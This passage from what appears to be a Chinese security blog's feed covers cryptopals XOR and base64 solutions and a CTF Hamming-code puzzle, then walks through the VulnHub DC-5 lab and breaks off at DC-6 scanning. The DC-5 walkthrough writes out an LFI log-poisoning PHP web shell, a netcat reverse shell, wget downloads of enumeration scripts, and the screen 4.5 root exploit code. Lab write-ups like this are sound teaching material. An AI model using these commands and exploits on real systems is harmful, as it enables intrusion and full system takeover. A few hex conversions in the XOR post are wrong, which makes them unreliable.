style="text-align:center">0001</td><td>0010</td><td>0011</td><td>0100</td><td>0101</td><td>0110</td><td>0111</td><td>1000</td><td>1001</td><td>……</td></tr></tbody></table><p>校验位：<code>1</code>、<code>2</code>、<code>4</code>、<code>8</code></p><h2 id="0x02-排列"><a href="#0x02-排列" class="headerlink" title="0x02 排列"></a>0x02 排列</h2><table><thead><tr><th style="text-align:center"><strong>汉明码</strong></th><th style="text-align:center">0</th><th>0</th><th>0</th><th>0</th><th>0</th><th>1</th><th>0</th><th>1</th><th>0</th><th>0</th><th>1</th><th>1</th></tr></thead><tbody><tr><td style="text-align:center"><strong>校验位</strong></td><td style="text-align:center">0</td><td>0</td><td>-</td><td>0</td><td>-</td><td>-</td><td>-</td><td>1</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td style="text-align:center"><strong>信息位</strong></td><td style="text-align:center">-</td><td>-</td><td>0</td><td>-</td><td>0</td><td>1</td><td>0</td><td>-</td><td>0</td><td>0</td><td>1</td><td>1</td></tr></tbody></table><p>发送端校验位：1000<br>得到：11000100</p><h2 id="0x03-纠错"><a href="#0x03-纠错" class="headerlink" title="0x03 纠错"></a>0x03 纠错</h2><table><thead><tr><th style="text-align:center">C</th><th style="text-align:center">1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th><th>8</th></tr></thead><tbody><tr><td style="text-align:center"><strong>信息位</strong></td><td style="text-align:center">0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>1</td><td>1</td></tr></tbody></table><p>接收端检验位：<br>P4=C5+C6+C7+C8=0+0+1+1=0<br>P3=C2+C3+C4+C8=0+1+0+1=0<br>P2=C1+C3+C4+C6+C7=0+1+0+0+1=0<br>P1=C1+C2+C4+C5+C7=0+0+0+0+1=1</p><table><thead><tr><th style="text-align:center"><strong>发送端校验位</strong></th><th style="text-align:center">1</th><th>0</th><th>0</th><th>0</th></tr></thead><tbody><tr><td style="text-align:center"><strong>接收端检验位</strong></td><td style="text-align:center">0</td><td>0</td><td>0</td><td>1</td></tr><tr><td style="text-align:center"><strong>监督位</strong></td><td style="text-align:center">1</td><td>0</td><td>0</td><td>1</td></tr></tbody></table><p>当监督位为：0000。说明接收方生成的校验位和收到的校验位相同，否则说明出错。<br>将<code>1001</code>转换为10进制<code>9</code>,说明验证码第9位出错，<br>正确的是：<code>110110100000</code>,md5哈希一下即答案</p><h1 id="到此结束"><a href="#到此结束" class="headerlink" title="到此结束"></a>到此结束</h1><p>如有错误请联系<a href="mailto:lanbaidetanlang@qq.com" target="_blank" rel="noopener">lanbaidetanlang@qq.com</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;#题目：&lt;br&gt;公司食堂最新出了一种小吃，叫鸡藕椒盐味汉堡，售价八块钱，为了促销，上面有一个验证码，输入后可以再换取一个汉堡。但是问题是每个验证码几乎都有错误,而且打印的时候倒了一下。小明买到了一个汉堡，准备还原验证码，因为一个吃不饱啊~~
    
    </summary>
    
      <category term="杂项" scheme="http://www.lanbainan.cn/categories/%E6%9D%82%E9%A1%B9/"/>
    
    
      <category term="CTF" scheme="http://www.lanbainan.cn/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>XOR编码实现</title>
    <link href="http://www.lanbainan.cn/2019/06/12/2019-06-12/"/>
    <id>http://www.lanbainan.cn/2019/06/12/2019-06-12/</id>
    <published>2019-06-12T14:49:00.000Z</published>
    <updated>2019-06-15T13:36:36.455Z</updated>
    
    <content type="html"><![CDATA[<h1 id="The-cryptopals-crypto-challenges"><a href="#The-cryptopals-crypto-challenges" class="headerlink" title="The cryptopals crypto challenges"></a>The cryptopals crypto challenges</h1><p>可以使用大多数主流语言，解决问题<br>环境：Python3.7.0<br>项目地址：<a href="http://cryptopals.com/sets/1/challenges/2" target="_blank" rel="noopener">http://cryptopals.com/sets/1/challenges/2</a><br><a id="more"></a> </p><h2 id="Fixed-XOR"><a href="#Fixed-XOR" class="headerlink" title="Fixed XOR"></a>Fixed XOR</h2><p><img src="https://i.loli.net/2019/06/12/5d00eb12704fe69057.png" alt="1.png"><br>例如：EVA and LAN</p><ul><li><p><strong>1</strong> - 将字符串–&gt;二进制</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">---ASCII/hex中直接到二进制---</span><br><span class="line">E = 69d = 0x45 = 01000101</span><br><span class="line">V = 86d = 0x56 = 01010110</span><br><span class="line">A = 65d = 0x41 = 01000001</span><br><span class="line">L = 76d = 0x4c = 01001100</span><br><span class="line">A = 65d = 0x41 = 01000001</span><br><span class="line">N = 78d = 0x4e = 01001110</span><br></pre></td></tr></table></figure></li><li><p><strong>2</strong> - XOR操作逻辑表如下：<br><img src="https://i.loli.net/2019/06/12/5d00f6ef7a5a066332.png" alt="2.png"><br>总结XOR（异或）一种逻辑运算，仅当输入不同时才输出ture</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">---对两对字符串进行异或处理---</span><br><span class="line">01000101 01010110 01000001   XOR&apos;d against</span><br><span class="line">01001100 01000001 01001110</span><br><span class="line">---结果---</span><br><span class="line">00001001 00010111 00001111</span><br><span class="line">---转换回ascii对应纯文本结果---</span><br><span class="line">00001001 = 0x09 = HT(水平定位符号)</span><br><span class="line">00010111 = 0x23 = ETB(区块传输结束)</span><br><span class="line">00001111 = 0x15 = SI(启用变换（Shift in）)</span><br></pre></td></tr></table></figure></li><li><p><strong>3</strong> - —测试—</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; ord(b&apos;E&apos;) ^ ord(b&apos;L&apos;)</span><br><span class="line">9</span><br><span class="line">&gt;&gt;&gt; chr(ord(b&apos;E&apos;) ^ ord(b&apos;L&apos;)).encode()</span><br><span class="line">b&apos;\t&apos;</span><br></pre></td></tr></table></figure></li></ul><p>代码实现：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import binascii</span><br><span class="line"></span><br><span class="line">def XOR_byte_date(byte_1,byte_2):</span><br><span class="line">    XOR_bytes = b&apos;&apos;</span><br><span class="line"></span><br><span class="line">    for b1,b2 in zip(byte_1,byte_2):</span><br><span class="line">        XOR_bytes += (bytes([b1 ^ b2]))</span><br><span class="line">    return XOR_bytes</span><br><span class="line">def main():</span><br><span class="line">    byte_table_1 = bytes.fromhex(&apos;1c0111001f010100061a024b53535009181c&apos;)</span><br><span class="line">    byte_table_2 = bytes.fromhex(&apos;686974207468652062756c6c277320657965&apos;)</span><br><span class="line">    print(binascii.hexlify(XOR_byte_date(byte_table_1,byte_table_2)).decode())</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/06/15/5d03e14d582bb11884.png" alt="3.png"></p><h1 id="到此结束"><a href="#到此结束" class="headerlink" title="到此结束"></a>到此结束</h1><p>如有错误请联系<a href="mailto:lanbaidetanlang@qq.com" target="_blank" rel="noopener">lanbaidetanlang@qq.com</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;The-cryptopals-crypto-challenges&quot;&gt;&lt;a href=&quot;#The-cryptopals-crypto-challenges&quot; class=&quot;headerlink&quot; title=&quot;The cryptopals crypto challenges&quot;&gt;&lt;/a&gt;The cryptopals crypto challenges&lt;/h1&gt;&lt;p&gt;可以使用大多数主流语言，解决问题&lt;br&gt;环境：Python3.7.0&lt;br&gt;项目地址：&lt;a href=&quot;http://cryptopals.com/sets/1/challenges/2&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://cryptopals.com/sets/1/challenges/2&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="杂项" scheme="http://www.lanbainan.cn/categories/%E6%9D%82%E9%A1%B9/"/>
    
    
      <category term="密码学" scheme="http://www.lanbainan.cn/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>将Hex转换为base64</title>
    <link href="http://www.lanbainan.cn/2019/06/04/2019-06-04/"/>
    <id>http://www.lanbainan.cn/2019/06/04/2019-06-04/</id>
    <published>2019-06-04T14:49:00.000Z</published>
    <updated>2019-06-15T13:36:56.632Z</updated>
    
    <content type="html"><![CDATA[<h1 id="The-cryptopals-crypto-challenges"><a href="#The-cryptopals-crypto-challenges" class="headerlink" title="The cryptopals crypto challenges"></a>The cryptopals crypto challenges</h1><p><strong>这是一个密码挑战</strong><br>可以使用大多数主流语言，解决问题<br>环境：Python3.7.0<br>项目地址：<a href="http://cryptopals.com/sets/1/challenges/1" target="_blank" rel="noopener">http://cryptopals.com/sets/1/challenges/1</a><br><a id="more"></a> </p><h2 id="Convert-hex-to-base64"><a href="#Convert-hex-to-base64" class="headerlink" title="Convert hex to base64"></a>Convert hex to base64</h2><p>将 hex（16进制）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">49276d206b696c6c696e6720796f757220627261696e206c696b65206120706f69736f6e6f7573206d757368726f6f6d</span><br></pre></td></tr></table></figure></p><p>打印为base64<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SSdtIGtpbGxpbmcgeW91ciBicmFpbiBsaWtlIGEgcG9pc29ub3VzIG11c2hyb29t</span><br></pre></td></tr></table></figure></p><p>base64和hex是一种编码手段，易还原<br>Base64本质上是一个ASCII字符表，其对应值64(0-63)个值<br><img src="https://i.loli.net/2019/06/05/5cf77eaf672d323367.png" alt="1.png"><br>每个base64数字恰好代表6 bits。因此，三个8 bits（即24位）可以由四个6 bits的base64表示。<br>列如：设定ASCII字符串<code>EVA</code>,将对其进行base64编码</p><ul><li><strong>1</strong> - 将字符串–&gt;十六进制<pre><code>---ASCII/hex---E = 69d = 0x45V = 86d = 0x56A = 65d = 0x41</code></pre></li><li><strong>2</strong> - 十六进制–&gt;二进制<pre><code>0x45 = 0100 01010x56 = 0101 01100x41 = 0100 0001</code></pre></li><li><strong>3</strong> - 将二进制字符串<code>01000101 01010110 01000001</code>总数除以6，得到4个对应base64字符的值<pre><code>010001 010101 011001 000001010001 = 17d = R010101 = 21d = V011001 = 25d = Z000001 = 1d = B</code></pre></li></ul><p>验证方案：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line"></span><br><span class="line">a = base64.b64encode(&apos;EVA&apos;.encode(&apos;utf-8&apos;))</span><br><span class="line">print(str(a, &apos;utf-8&apos;))</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; RVZB</span><br></pre></td></tr></table></figure></p><p>当不能被6整除时，在编码末尾加入一个或两个<code>=</code>(<code>=</code>代表<code>000000</code>)</p><h2 id="代码实现1"><a href="#代码实现1" class="headerlink" title="代码实现1"></a>代码实现1</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">import binascii</span><br><span class="line"></span><br><span class="line">string = &quot;49276d206b696c6c696e6720796f757220627261696e206c696b65206120706f69736f6e6f7573206d757368726f6f6d&quot;</span><br><span class="line">raw = binascii.unhexlify(string)</span><br><span class="line">bin_raw = base64.b64encode(raw).decode()</span><br><span class="line">print(bin_raw)</span><br></pre></td></tr></table></figure><h2 id="代码实现2"><a href="#代码实现2" class="headerlink" title="代码实现2"></a>代码实现2</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding=UTF-8 -*-</span><br><span class="line">b64_table = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def b64_encode(input_bytes):</span><br><span class="line">    # base64编码实现</span><br><span class="line">    </span><br><span class="line">    # 初始化变量</span><br><span class="line">    encoding_output = &apos;&apos;</span><br><span class="line"># 将输入字符转换为二进制，并创建1和0的列表</span><br><span class="line">    bit_list = list(&apos;&apos;.join([bin(byte)[2:].zfill(8) for byte in input_bytes]))</span><br><span class="line"></span><br><span class="line"># 将bit_list列表划分为6 bits一组</span><br><span class="line">    chunks = [bit_list[i:i + 6] for i in range(0, len(bit_list), 6)]</span><br><span class="line"></span><br><span class="line">    for chunk in chunks:</span><br><span class="line">        # 将chunks转化为010010这类</span><br><span class="line">        chunk = &apos;&apos;.join(chunk)</span><br><span class="line"></span><br><span class="line">        #检查chunk长度，根据需要在末尾添加&apos;=&apos;字符</span><br><span class="line">        if len(chunk) == 2:</span><br><span class="line">            if &apos;1&apos; in chunk:</span><br><span class="line">                chunk += &apos;0000&apos;</span><br><span class="line">                encoding_output += b64_table[int(chunk, 2)] + &apos;==&apos;</span><br><span class="line">            else:</span><br><span class="line">                encoding_output += &apos;==&apos;</span><br><span class="line">        elif len(chunk) == 4:</span><br><span class="line">            if &apos;1&apos; in chunk:</span><br><span class="line">                chunk += &apos;00&apos;</span><br><span class="line">                encoding_output += b64_table[int(chunk, 2)] + &apos;=&apos;</span><br><span class="line">            else:</span><br><span class="line">                encoding_output += &apos;=&apos;</span><br><span class="line">        elif len(chunk) == 6:</span><br><span class="line">            encoding_output += b64_table[int(chunk, 2)]</span><br><span class="line">    return encoding_output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    string = &apos;49276d206b696c6c696e6720796f757220627261696e206c696b65206120706f69736f6e6f7573206d757368726f6f6d&apos;</span><br><span class="line">    byte_string = bytes.fromhex(string)</span><br><span class="line">    print(b64_encode(byte_string))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h1 id="到此结束"><a href="#到此结束" class="headerlink" title="到此结束"></a>到此结束</h1><p>如有错误请联系<a href="mailto:lanbaidetanlang@qq.com" target="_blank" rel="noopener">lanbaidetanlang@qq.com</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;The-cryptopals-crypto-challenges&quot;&gt;&lt;a href=&quot;#The-cryptopals-crypto-challenges&quot; class=&quot;headerlink&quot; title=&quot;The cryptopals crypto challenges&quot;&gt;&lt;/a&gt;The cryptopals crypto challenges&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;这是一个密码挑战&lt;/strong&gt;&lt;br&gt;可以使用大多数主流语言，解决问题&lt;br&gt;环境：Python3.7.0&lt;br&gt;项目地址：&lt;a href=&quot;http://cryptopals.com/sets/1/challenges/1&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://cryptopals.com/sets/1/challenges/1&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="杂项" scheme="http://www.lanbainan.cn/categories/%E6%9D%82%E9%A1%B9/"/>
    
    
      <category term="密码学" scheme="http://www.lanbainan.cn/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>对于DC-5和DC-6的测试</title>
    <link href="http://www.lanbainan.cn/2019/05/30/2019-05-30/"/>
    <id>http://www.lanbainan.cn/2019/05/30/2019-05-30/</id>
    <published>2019-05-30T04:06:00.000Z</published>
    <updated>2019-06-03T16:53:10.572Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DC-5"><a href="#DC-5" class="headerlink" title="DC-5"></a>DC-5</h1><p>主机NET模式<br>实验目的：找到flag（提示随着页面刷新而改变的东西，没有涉及phpmailer漏洞）<br>项目地址：<a href="https://www.vulnhub.com/entry/dc-5,314/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/dc-5,314/</a><br><a id="more"></a> </p><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# arp-scan -l</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/05/31/5cf08598d49c513590.png" alt="1.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nmap -T4 -A -v -p1-65535 192.168.67.146</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">80/tcp    open  http    nginx 1.6.2</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Supported Methods: GET HEAD POST</span><br><span class="line">|_http-server-header: nginx/1.6.2</span><br><span class="line">|_http-title: Welcome</span><br><span class="line">111/tcp   open  rpcbind 2-4 (RPC #100000)</span><br><span class="line">| rpcinfo:</span><br><span class="line">|   program version   port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp  rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp  rpcbind</span><br><span class="line">|   100024  1          33746/udp  status</span><br><span class="line">|_  100024  1          48648/tcp  status</span><br><span class="line">48648/tcp open  status  1 (RPC #100024)</span><br></pre></td></tr></table></figure></p><h2 id="入口"><a href="#入口" class="headerlink" title="入口"></a>入口</h2><p>进入页面没看见什么东东<br><img src="https://i.loli.net/2019/05/31/5cf08a392befa98955.png" alt="2.png"><br>爆破没有出货，在一顿瞎搞后发现<code>contact</code>页面在提交留言后，出现改变<br><img src="https://i.loli.net/2019/05/31/5cf08b3bb6eab49513.png" alt="3.png"><br>刷新一次改变一次，与提示相符</p><h3 id="Wfuzz"><a href="#Wfuzz" class="headerlink" title="Wfuzz"></a><a href="https://blog.csdn.net/hardhard123/article/details/79596104" target="_blank" rel="noopener">Wfuzz</a></h3><p>使用<code>wfuzz</code>测试页面参数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# wfuzz -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt  -w /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest.txt -u http://192.1 68.67.146/thankyou.php?FUZZ=FUZ2Z &gt; test.txt</span><br></pre></td></tr></table></figure></p><p>排序发现<code>file</code>参数<br><img src="https://i.loli.net/2019/05/31/5cf0add89545c86282.png" alt="4.png"></p><h2 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.67.146//thankyou.php?file=/etc/passwd</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/05/31/5cf0af2c39a6639708.png" alt="5.png"><br>中间件使用的是<code>Nginx</code>,查看日志文件（操作日志<code>access.log</code>或者错误日志<code>error.log</code>）将WebShell写入<code>access.log</code>或者<code>error.log</code>日志，这里写入的是<code>access.log</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system($_GET[&apos;cmd&apos;]) ?&gt;</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">λ nc 192.168.67.146 80</span><br><span class="line">&lt;?php system($_GET[&apos;cmd&apos;]) ?&gt;</span><br><span class="line">HTTP/1.1 400 Bad Request</span><br><span class="line">Server: nginx/1.6.2</span><br><span class="line">Date: Thu, 30 May 2019 14:16:19 GMT</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Content-Length: 172</span><br><span class="line">Connection: close</span><br><span class="line">                                           </span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;&lt;title&gt;400 Bad Request&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">&lt;body bgcolor=&quot;white&quot;&gt;</span><br><span class="line">&lt;center&gt;&lt;h1&gt;400 Bad Request&lt;/h1&gt;&lt;/center&gt;</span><br><span class="line">&lt;hr&gt;&lt;center&gt;nginx/1.6.2&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/05/31/5cf0eeba6004377570.png" alt="6.png"><br><strong>反弹shell</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.67.146//thankyou.php?file=/var/log/nginx/access.log&amp;cmd=nc 192.168.67.1 4444 -e /bin/bash</span><br><span class="line">λ nc -nlvp 4444</span><br><span class="line">python -c &quot;import pty;pty.spawn(&apos;/bin/bash&apos;)&quot;</span><br><span class="line">www-data@dc-5:~/html$</span><br></pre></td></tr></table></figure></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>下载提权脚本<code>LinEnum</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop/LinEnum# python -m SimpleHTTPServer 80 #简易HTTP服务器</span><br><span class="line">www-data@dc-5:/tmp$ wget http://192.168.67.128/LinEnum.sh</span><br><span class="line">www-data@dc-5:/tmp$ chmod u+x LinEnum.sh</span><br><span class="line">www-data@dc-5:/tmp$ ./LinEnum</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/05/31/5cf0f5dd1472c75390.png" alt="7.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# searchsploit screen 4.5</span><br><span class="line">root@kali:~# nc -nlvp 5555 &lt; /usr/share/exploitdb/exploits/linux/local/41154.sh -q 1</span><br><span class="line">www-data@dc-5:/tmp$ nc 192.168.67.128 5555 &gt; test.sh</span><br><span class="line">www-data@dc-5:/tmp$ chmod u+x test.sh</span><br></pre></td></tr></table></figure></p><p>这个PoC似乎不能运行<br>将其拆分为两个文件<br><code>libhax.c</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line">void dropshell(void)&#123;</span><br><span class="line">    chown(&quot;/tmp/rootshell&quot;, 0, 0);</span><br><span class="line">    chmod(&quot;/tmp/rootshell&quot;, 04755);</span><br><span class="line">    unlink(&quot;/etc/ld.so.preload&quot;);</span><br><span class="line">    printf(&quot;[+] done!\n&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><code>rootshell.c</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main(void)&#123;</span><br><span class="line">    setuid(0);</span><br><span class="line">    setgid(0);</span><br><span class="line">    seteuid(0);</span><br><span class="line">    setegid(0);</span><br><span class="line">    execvp(&quot;/bin/sh&quot;, NULL, NULL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>编译<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kali:~# gcc -fPIC -shared -ldl -o ./libhax.so ./libhax.c</span><br><span class="line">root@kali:~# gcc -o ./rootshell ./rootshell.c</span><br><span class="line">www-data@dc-5:/tmp$ wget http://192.168.67.128/libhax.so</span><br><span class="line">www-data@dc-5:/tmp$ wget http://192.168.67.128/rootshell</span><br></pre></td></tr></table></figure></p><p>照着脚本接着做<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">www-data@dc-5:/etc$ cd /etc</span><br><span class="line">www-data@dc-5:/etc$ umask 000</span><br><span class="line">www-data@dc-5:/etc$ screen -D -m -L ld.so.preload echo -ne  &quot;\x0a/tmp/libhax.so&quot;</span><br><span class="line">www-data@dc-5:/etc$ screen -ls</span><br><span class="line">www-data@dc-5:/etc$ /tmp/rootshell</span><br><span class="line">#</span><br></pre></td></tr></table></figure></p><h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@dc-5:/root# cat thisistheflag.txt</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/05/31/5cf106957effb26569.png" alt="8.png"></p><h1 id="DC-6"><a href="#DC-6" class="headerlink" title="DC-6"></a>DC-6</h1><p>主机NET模式<br>实验目的：找到flag（cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt）<br>项目地址：主机NET模式<br>实验目的：找到flag<br>项目地址：<a href="https://www.vulnhub.com/entry/dc-6,315/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/dc-6,315/</a></p><h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# arp-scan -l</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/06/03/5cf4f30f96d3512372.png" alt="9.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">kali:~# nmap -T4 -A -v -p1-65535 192.168.67.147</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 3e:52:ce:ce:01:b6:94:eb:7b:03:7d:be:08:7f:5f:fd (RSA)</span><br><span class="line">|   256 3c:83:65:71:dd:73:d7:23:f8:83:0d:e3:46:bc:b5:6f (ECDSA)</span><br><span class="line">|_  256 41:89:9e:85:ae:30:5b:e0:8f:a4:68:71:06:b4:15:ee (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.25 ((Debian))</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: Apache/2.4.25 